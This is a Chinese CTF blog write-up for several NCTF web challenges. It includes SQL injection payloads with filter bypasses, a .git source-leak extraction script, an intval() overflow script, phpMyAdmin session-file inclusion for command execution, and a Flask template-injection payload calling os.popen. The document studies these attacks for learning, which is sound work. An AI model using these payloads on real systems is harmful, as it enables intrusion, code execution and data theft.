@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>NCTF Web大部分wp | Iuhrey的幻想乡</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="前言近期刚刚打完NCTF，成绩还算理想，虽然我们打了校内第二，总榜第七，但是赛后发现了很多问题，借此复盘一下这次的比赛。(Web题12道只做出了七道题目，赛后做了一道，实力还是欠缺一点) 签到题抓包，得到flag. 滴！晨跑打卡很明显这是一道注入题，抓包爆破测试一下过滤的字符发现空格，–，#，*等被过滤了，使用连接词测试一下语句构成：11&amp;apos;or&amp;apos;1&amp;apos;=&amp;apos;1">
+<meta name="keywords" content="比赛心得">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NCTF Web大部分wp">
+<meta property="og:url" content="http://yoursite.com/2018/11/28/NCTF赛后wp-以及复现未做出的题目/index.html">
+<meta property="og:site_name" content="Iuhrey的幻想乡">
+<meta property="og:description" content="前言近期刚刚打完NCTF，成绩还算理想，虽然我们打了校内第二，总榜第七，但是赛后发现了很多问题，借此复盘一下这次的比赛。(Web题12道只做出了七道题目，赛后做了一道，实力还是欠缺一点) 签到题抓包，得到flag. 滴！晨跑打卡很明显这是一道注入题，抓包爆破测试一下过滤的字符发现空格，–，#，*等被过滤了，使用连接词测试一下语句构成：11&amp;apos;or&amp;apos;1&amp;apos;=&amp;apos;1">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/images/22/1.png">
+<meta property="og:image" content="http://yoursite.com/images/22/2.png">
+<meta property="og:image" content="http://yoursite.com/images/22/3.png">
+<meta property="og:image" content="http://yoursite.com/images/22/4.png">
+<meta property="og:image" content="http://yoursite.com/images/22/5.png">
+<meta property="og:image" content="http://yoursite.com/images/22/6.png">
+<meta property="og:image" content="http://yoursite.com/images/22/7.png">
+<meta property="og:image" content="http://yoursite.com/images/22/8.png">
+<meta property="og:image" content="http://yoursite.com/images/22/9.png">
+<meta property="og:image" content="http://yoursite.com/images/22/10.png">
+<meta property="og:image" content="http://yoursite.com/images/22/11.png">
+<meta property="og:image" content="http://yoursite.com/images/22/12.png">
+<meta property="og:image" content="http://yoursite.com/images/22/13.png">
+<meta property="og:image" content="http://yoursite.com/images/22/14.png">
+<meta property="og:image" content="http://yoursite.com/images/22/15.png">
+<meta property="og:image" content="http://yoursite.com/images/22/16.png">
+<meta property="og:image" content="http://yoursite.com/images/22/17.png">
+<meta property="og:image" content="http://yoursite.com/images/22/18.png">
+<meta property="og:image" content="http://yoursite.com/images/22/19.png">
+<meta property="og:image" content="http://yoursite.com/images/22/20.png">
+<meta property="og:image" content="http://yoursite.com/images/22/21.png">
+<meta property="og:image" content="http://yoursite.com/images/22/22.png">
+<meta property="og:image" content="http://yoursite.com/images/22/23.png">
+<meta property="og:updated_time" content="2018-11-28T12:22:57.550Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="NCTF Web大部分wp">
+<meta name="twitter:description" content="前言近期刚刚打完NCTF，成绩还算理想，虽然我们打了校内第二，总榜第七，但是赛后发现了很多问题，借此复盘一下这次的比赛。(Web题12道只做出了七道题目，赛后做了一道，实力还是欠缺一点) 签到题抓包，得到flag. 滴！晨跑打卡很明显这是一道注入题，抓包爆破测试一下过滤的字符发现空格，–，#，*等被过滤了，使用连接词测试一下语句构成：11&amp;apos;or&amp;apos;1&amp;apos;=&amp;apos;1">
+<meta name="twitter:image" content="http://yoursite.com/images/22/1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Iuhrey的幻想乡" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="source/images/favicon.ico">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/plugin/bganimation/bg.css">
+  
+
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <div class="outer">
+        <div class="widget-wrap mobile-header">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="/images/avatar.jpg">
+    <h2 class="author">Iuhrey</h2>
+    <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>28</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>2</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>12</strong><br>标签</div></a>
+    </div>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>幻想乡的起点</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>幻想乡图</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分岔路</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>路标</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+        <section id="main"><article id="post-NCTF赛后wp-以及复现未做出的题目" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/11/28/NCTF赛后wp-以及复现未做出的题目/" class="article-date">
+  <time class="post-time" datetime="2018-11-28T07:36:23.000Z" itemprop="datePublished">
+    <span class="post-month">11月</span><br>
+    <span class="post-day">28</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      NCTF Web大部分wp
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>近期刚刚打完NCTF，成绩还算理想，虽然我们打了校内第二，总榜第七，但是赛后发现了很多问题，借此复盘一下这次的比赛。(Web题12道只做出了七道题目，赛后做了一道，实力还是欠缺一点)</p>
+<h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>抓包，得到flag.</p>
+<h2 id="滴！晨跑打卡"><a href="#滴！晨跑打卡" class="headerlink" title="滴！晨跑打卡"></a>滴！晨跑打卡</h2><p>很明显这是一道注入题，抓包爆破测试一下过滤的字符发现空格，–，#，*等被过滤了，使用连接词测试一下语句构成：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;or&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure></p>
+<p>发现正常回显，可以判断大概是’ $_POST[\’XXX\’] ‘这种类型，空格可以使用%0b绕过，注释被过滤我们只要拼接语句让其正常查询不报错就行了，所以大致可以构造payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;union%0bselect%0b1,2,3%0b&apos;</span><br></pre></td></tr></table></figure></p>
+<p>可以看到回显位：<br><img src="/images/22/1.png" alt=""><br>接着按照套路查询就行了，最后一步注意要标记是哪个数据库：<br><img src="/images/22/2.png" alt=""><br>得到flag.</p>
+<h2 id="Go-Lakers"><a href="#Go-Lakers" class="headerlink" title="Go Lakers"></a>Go Lakers</h2><p>这题一开始套路和签到题一样，得抓包，拉到最下面发现这样一句话：<br><img src="/images/22/3.png" alt=""><br>按照要求post viewsource=1得到源码：<br><img src="/images/22/4.png" alt=""><br>这里我当时做的时候掉进陷阱了，我以为要绕过所有的条件才能利用file_get_contents()得到源码，这里只用传入加密后的file_参数就能输出源码了，这里分享绕过的方式吧。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">if(!(getip() === &apos;127.0.0.1&apos; &amp;&amp; file_get_contents($_GET[&apos;9527&apos;]) === &apos;nctf_is_good&apos; &amp;&amp; mt_rand(1,10000) === intval($_GET[&apos;go_Lakers&apos;])))&#123;</span><br><span class="line">    header(&apos;location:https://bbs.hupu.com/24483652.html?share_from=kqapp&apos;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &apos;great&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>第一个条件可以使用XFF: 127.0.0.1来绕过，但是会有个提示:<br><img src="/images/22/5.png" alt=""><br>使用Client-IP就行了，第二个使用php://input协议传入字符就行，第三个我们可以使用多线程爆破，毕竟只有10000个数据。接下来就是加密函数了，按照解密函数写就行了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function en_code($value)&#123;</span><br><span class="line">    $result = &apos;&apos;;</span><br><span class="line">    for($i=0;$i&lt;strlen($value);$i++)&#123;</span><br><span class="line">        $result .= chr(ord($value[$i])+$i*2);</span><br><span class="line">    &#125;</span><br><span class="line">    return base64_encode($result)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>直接读flag.php就能得到flag.</p>
+<h2 id="全球最大交友网站"><a href="#全球最大交友网站" class="headerlink" title="全球最大交友网站"></a>全球最大交友网站</h2><p>题目就给了一个很直接的提示，猜测应该是.git泄露，测试果然发现没错:<br><img src="/images/22/6.png" alt=""><br>使用Githack脚本跑一下只能跑出一个README.md，打开发现了这样一句话:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Allsource files are in git tag1.0</span><br></pre></td></tr></table></figure></p>
+<p>emmm，这就能联想这一篇文章：<a href="https://www.leavesongs.com/PENETRATION/XDCTF-2015-WEB2-WRITEUP.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/XDCTF-2015-WEB2-WRITEUP.html</a><br>题目思路也很简单，就是让我们提取出源码就能得到flag了，具体原理可以看上面离别歌大师傅这篇文章，这里不讲太详细。<br>首先我们访问commit的一个“链接”:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctfgame.acdxvfsvd.net:20003/.git/refs/tags/1.0</span><br></pre></td></tr></table></figure></p>
+<p>得到一串字符串，按照.git文件生成原理，我们访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctfgame.acdxvfsvd.net:20003/.git/objects/01/b878ee5f39810a02f06b4a560571413020ea42</span><br></pre></td></tr></table></figure></p>
+<p>得到一个文件，通过对这个文件进行zlib解压发现了这个文件指向了两个文件:<br><img src="/images/22/7.png" alt=""><br>emmm，这里说下原理，我们就根据这两个字符串，按照刚刚的方法得到下一个文件，zlib解压，对文件的头进行判断，重复过程最终得到最初的文件，最后下载的文件我们没办法zlib解压，可以通过git cat-file xxxxx得到最终文件。这里贴个离别歌改过的脚本，我写了个注释有利于标识该改哪里:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- encoding: utf-8 -*-</span><br><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line">import os</span><br><span class="line">import zlib</span><br><span class="line">import re</span><br><span class="line">import Queue</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0)&quot;</span><br><span class="line">        &quot; Gecko/20100101 Firefox/46.0&quot;</span><br><span class="line">&#125;#改头</span><br><span class="line">target = &quot;http://ctfgame.acdxvfsvd.net:20003/.git/&quot;  #地址</span><br><span class="line">output_folder = &quot;./n1ctf/&quot;   #储存文件的目录</span><br><span class="line"></span><br><span class="line">class GitDdatabase(object):</span><br><span class="line">    def __init__(self, data):</span><br><span class="line">        self.data = data</span><br><span class="line">        self.pos = 0</span><br><span class="line"></span><br><span class="line">    def read_to_next_char(self, char=&quot; &quot;):</span><br><span class="line">        pos = self.data.index(char, self.pos)</span><br><span class="line">        ret = self.read_exact(pos)</span><br><span class="line">        self.pos += 1</span><br><span class="line">        return ret</span><br><span class="line"></span><br><span class="line">    def read_exact(self, size):</span><br><span class="line">        ret = self.data[self.pos:size]</span><br><span class="line">        self.pos = size</span><br><span class="line">        return ret</span><br><span class="line"></span><br><span class="line">    def read_blob(self):</span><br><span class="line">        return re.sub(&apos;^blob \d+?\00&apos;, &apos;&apos;, self.data)</span><br><span class="line"></span><br><span class="line">    def read_tree(self):</span><br><span class="line">        mode = self.read_to_next_char(&quot; &quot;)</span><br><span class="line">        filename = self.read_to_next_char(&quot;\x00&quot;)</span><br><span class="line">        sha1 = self.read_exact(self.pos + 20)</span><br><span class="line">        return mode, filename, sha1</span><br><span class="line"></span><br><span class="line">    def get_db_type(self):</span><br><span class="line">        file_sort = self.read_to_next_char(&quot; &quot;)</span><br><span class="line">        file_size = self.read_to_next_char(&quot;\x00&quot;)</span><br><span class="line">        file_size = int(file_size)</span><br><span class="line">        return file_sort, file_size</span><br><span class="line"></span><br><span class="line">def request_object(id):</span><br><span class="line">    global target</span><br><span class="line">    folder = &apos;objects/%s/&apos; % id[:2]</span><br><span class="line">    response = requests.get(target + folder + id[2:])</span><br><span class="line">    if response.status_code == 200:</span><br><span class="line">        return zlib.decompress(response.content)</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    response = requests.get(target + &quot;refs/tags/1.0&quot;, headers=headers)</span><br><span class="line">    if response.status_code == 404:</span><br><span class="line">        print(&quot;No this tag&quot;)</span><br><span class="line">        sys.exit(0)</span><br><span class="line">    data = response.content</span><br><span class="line">    commit_id = data.strip()</span><br><span class="line"></span><br><span class="line">    next_id = commit_id   ##可以更改要找的目录的值，即可查找出其目录下的源码</span><br><span class="line">    print next_id</span><br><span class="line">    data = request_object(next_id)</span><br><span class="line">    if not data:</span><br><span class="line">        print(&quot;No this commit id&quot;)</span><br><span class="line">        sys.exit(0)</span><br><span class="line"></span><br><span class="line">    rex = re.search(ur&quot;commit .*?([a-f0-9]&#123;40&#125;)&quot;, data)</span><br><span class="line">    next_id = rex.group(1)</span><br><span class="line">    data = request_object(next_id)</span><br><span class="line">    if not data:</span><br><span class="line">        print(&quot;No this commit id&quot;)</span><br><span class="line">        sys.exit(0)</span><br><span class="line"></span><br><span class="line">    tasks = Queue.Queue()</span><br><span class="line">    gd = GitDdatabase(data)</span><br><span class="line">    file_sort, file_size = gd.get_db_type()</span><br><span class="line">    while 1:</span><br><span class="line">        try:</span><br><span class="line">            (mode, filename, sha1) = gd.read_tree()</span><br><span class="line">            basedir = &quot;./&quot;</span><br><span class="line">            tasks.put((mode, filename, sha1, basedir))</span><br><span class="line">        except ValueError as e:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">    while 1:</span><br><span class="line">        if tasks.empty():</span><br><span class="line">            break</span><br><span class="line">        (mode, filename, sha1, basedir) = tasks.get()</span><br><span class="line">        sha1 = binascii.b2a_hex(sha1)</span><br><span class="line">        data = request_object(sha1)</span><br><span class="line">        if not data:</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">        gd = GitDdatabase(data)</span><br><span class="line">        file_sort, file_size = gd.get_db_type()</span><br><span class="line">        if file_sort == &quot;tree&quot;:</span><br><span class="line">            basedir = os.path.join(basedir, filename)</span><br><span class="line">            while 1:</span><br><span class="line">                try:</span><br><span class="line">                    (mode, filename, sha1) = gd.read_tree()</span><br><span class="line">                    tasks.put((mode, filename, sha1, basedir))</span><br><span class="line">                except ValueError as e:</span><br><span class="line">                    break</span><br><span class="line">        elif file_sort == &quot;blob&quot;:</span><br><span class="line">            data = gd.read_blob()</span><br><span class="line">            folder = os.path.join(output_folder, basedir)</span><br><span class="line">            if not os.path.exists(folder):</span><br><span class="line">                os.makedirs(folder)</span><br><span class="line">            filename = os.path.join(folder, filename)</span><br><span class="line">            with open(filename, &quot;wb&quot;) as f:</span><br><span class="line">                f.write(data)</span><br><span class="line">            print(&quot;[+] Write &#123;filename&#125; success&quot;.format(filename=filename))</span><br></pre></td></tr></table></figure></p>
+<p>最后可以得到两个flag,一真一假自己尝试。</p>
+<h2 id="小绿草之最强大脑"><a href="#小绿草之最强大脑" class="headerlink" title="小绿草之最强大脑"></a>小绿草之最强大脑</h2><p>这个单纯就是考脚本能力了，题目有个提示：告诉我们有源码泄露，访问index.php.bak得到源码：<br><img src="/images/22/8.png" alt=""><br>里面关键点就在于<strong>intval()</strong>这个函数，这个函数在处理太过于大的数字的时候会出现漏洞，虽然说可以防止整数溢出漏洞，但是通过这样计算出的值就会出现bug。<br>通过本地测试，测试出在数字足够大时，intval()一直为2147483647，如图:<br><img src="/images/22/9.png" alt=""><br>但是在服务器上测试值却为9223372036854775807:<br><img src="/images/22/10.png" alt=""><br>最后测试也是9223372036854775807没错，所以脚本如下(记得使用session,以及time.sleep函数):<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">def cal(str):  #传入抓取的源码</span><br><span class="line">    pstr = &apos;&lt;div style=&quot;display:inline;&quot;&gt;&apos;</span><br><span class="line">    jstr = &apos; &lt;/div&gt;&lt;div style=&quot;display:inline;&quot;&gt;&apos;</span><br><span class="line">    num = len(jstr)</span><br><span class="line">    index = str.index(pstr) + len(pstr)</span><br><span class="line">    calstr = &quot;&quot;</span><br><span class="line">    for i in range(0, 71):</span><br><span class="line">        calnum = index + i * num</span><br><span class="line">        calstr = calstr + str[calnum]</span><br><span class="line">    if &quot;=&quot; in calstr:</span><br><span class="line">        calstr = calstr.replace(&quot;=&quot;, &quot;&quot;)</span><br><span class="line">    if &quot;e&quot; in calstr:</span><br><span class="line">        calstr = calstr.replace(&quot;e&quot;, &quot;&quot;)</span><br><span class="line">    if &quot;v&quot; in calstr:</span><br><span class="line">        calstr = calstr.replace(&quot;v&quot;, &quot;&quot;)</span><br><span class="line">    print calstr</span><br><span class="line">    return eval(calstr)</span><br><span class="line">def test(str):  #传入抓取的源码</span><br><span class="line">    pstr = &apos;&lt;div style=&quot;display:inline;&quot;&gt;&apos;</span><br><span class="line">    jstr = &apos; &lt;/div&gt;&lt;div style=&quot;display:inline;&quot;&gt;&apos;</span><br><span class="line">    num = len(jstr)</span><br><span class="line">    index = str.index(pstr) + len(pstr)</span><br><span class="line">    calstr = &quot;&quot;</span><br><span class="line">    for i in range(0, 71):</span><br><span class="line">        calnum = index + i * num</span><br><span class="line">        calstr = calstr + str[calnum]</span><br><span class="line">    if &quot;=&quot; in calstr:</span><br><span class="line">        calstr = calstr.replace(&quot;=&quot;, &quot;&quot;)</span><br><span class="line">    if &quot;e&quot; in calstr:</span><br><span class="line">        calstr = calstr.replace(&quot;e&quot;, &quot;&quot;)</span><br><span class="line">    if &quot;v&quot; in calstr:</span><br><span class="line">        calstr = calstr.replace(&quot;v&quot;, &quot;&quot;)</span><br><span class="line">    print calstr</span><br><span class="line">url = &quot;http://ctfgame.acdxvfsvd.net:20004/&quot;</span><br><span class="line">s = requests.session()</span><br><span class="line">re = s.get(url)</span><br><span class="line">content = re.content</span><br><span class="line">count = cal(content)</span><br><span class="line">time.sleep(1)</span><br><span class="line">res = s.post(url,data=&#123;&quot;input&quot;:12345678987654345678900987634535353454351432534543645,&quot;ans&quot;:count + 9223372036854775807&#125;)</span><br><span class="line">count1 = cal(res.content)</span><br><span class="line">time.sleep(1)</span><br><span class="line">res1 = s.post(url,data=&#123;&quot;input&quot;:12345678987654345678900987634535353454351432534543645,&quot;ans&quot;:count1 + 9223372036854775807&#125;)</span><br><span class="line">count2 = cal(res1.content)</span><br><span class="line">time.sleep(1)</span><br><span class="line">res2 = s.post(url,data=&#123;&quot;input&quot;:12345678987654345678900987634535353454351432534543645,&quot;ans&quot;:count2 + 9223372036854775807&#125;)</span><br><span class="line">count3 = cal(res2.content)</span><br><span class="line">time.sleep(1)</span><br><span class="line">res3 = s.post(url,data=&#123;&quot;input&quot;:12345678987654345678900987634535353454351432534543645,&quot;ans&quot;:count3 + 9223372036854775807&#125;)</span><br><span class="line">count4 = cal(res3.content)</span><br><span class="line">time.sleep(1)</span><br><span class="line">res4 = s.post(url,data=&#123;&quot;input&quot;:12345678987654345678900987634535353454351432534543645,&quot;ans&quot;:count4 + 9223372036854775807&#125;)</span><br><span class="line">print res4.content</span><br></pre></td></tr></table></figure></p>
+<p>五次之后得到flag.</p>
+<h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><p>这题目当时卡死是因为没意识到guest/guest账号的存在，亏我还用50000条弱密码在爆破root密码，欸，要不然是可以做出来的。<br>首先可以查看下info.php，里面有一些最基本的信息。<br>使用guest/guest登入，发现这个东西:<br><img src="/images/22/11.png" alt=""><br>这东西写在这摆明了说来日我啊，这个可以联想到之前Chamd5爆出的这个漏洞：<a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247485036&amp;idx=1&amp;sn=8e9647906c5d94f72564dec5bc51a2ab&amp;chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&amp;mpshare=1&amp;scene=1&amp;srcid=0621gAv1FMtrgoahD01psMZr&amp;pass_ticket=LqhRfckPxAVG2dF/jxV/9/cEb5pShRgewJe/ttJn2gIlIyGF/bsgGmzcbsV%2bLmMK#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247485036&amp;idx=1&amp;sn=8e9647906c5d94f72564dec5bc51a2ab&amp;chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&amp;mpshare=1&amp;scene=1&amp;srcid=0621gAv1FMtrgoahD01psMZr&amp;pass_ticket=LqhRfckPxAVG2dF/jxV/9/cEb5pShRgewJe/ttJn2gIlIyGF/bsgGmzcbsV%2bLmMK#rd</a><br>具体源码分析可以看这一篇文章，接着利用点就很清晰了，我们只要把命令写进本地文件，然后通过本地文件包含执行命令就能拿到flag。这里我们可以利用session文件，session文件会记录当前cookies用户的操作，我们只要执行一个包含了命令的操作就行了。接下来就很简单了。<br>首先我们记录下现在cookies中phpmyadmin的值，为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ft262cg8vj2v0r8feei75nlveojcmu32</span><br></pre></td></tr></table></figure></p>
+<p>通过执行查询操作，把我们的命令写入本地文件:<br><img src="/images/22/12.png" alt=""><br>写入成功利用本地文件包含漏洞执行命令，session文件默认保存在/tmp/sess_你的sessionid下:<br><img src="/images/22/13.png" alt=""><br>可以看到命令成功执行了，接着读取根目录文件，发现下面有个nctfffffffff文件，读取得到flag:<br><img src="/images/22/14.png" alt=""></p>
+<h2 id="flask真香"><a href="#flask真香" class="headerlink" title="flask真香"></a>flask真香</h2><p>这看题目第一反应就是ssti,进去一测试，果不其然:<br><img src="/images/22/15.png" alt=""><br>接着测试发现config，items，for，mro等等都被过滤了，但是有个特点，在我测试双写绕过时发现了这貌似是个贪婪模式，没办法进行绕过，但是前段时间Tykyo里面有道题目是把config置换为了none了，我在想会不会这里也是一样的，接着测试，发现了果然是这样:<br><img src="/images/22/16.png" alt=""><br>接着普及几个魔术方法，这些都是用来找类调用所使用的方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__class__  返回类型所属的对象</span><br><span class="line">__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__base__   返回该对象所继承的基类</span><br><span class="line">// __base__和__mro__都是用来寻找基类的</span><br><span class="line"></span><br><span class="line">__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  对包含函数全局变量的字典的引用</span><br></pre></td></tr></table></figure></p>
+<p>首先找到object类:<br><img src="/images/22/17.png" alt=""><br>查看有啥可利用的子类:<br><img src="/images/22/18.png" alt=""><br>emmmm，在357位置找到了了一个warnings，这下面是可以调用os模块的，接着调出可以执行命令的函数popen就可以读取文件了，payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&apos;&apos;.__claconfigss__.__baconfigse__.__subclaconfigsses__()[357]()._module.__buiconfigltins__[&apos;__imconfigport__&apos;](&apos;oconfigs&apos;).poconfigpen(&apos;ls -a&apos;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>在根目录下发现了Th1s__is_S3cret文件，读取文件就能得到flag.</p>
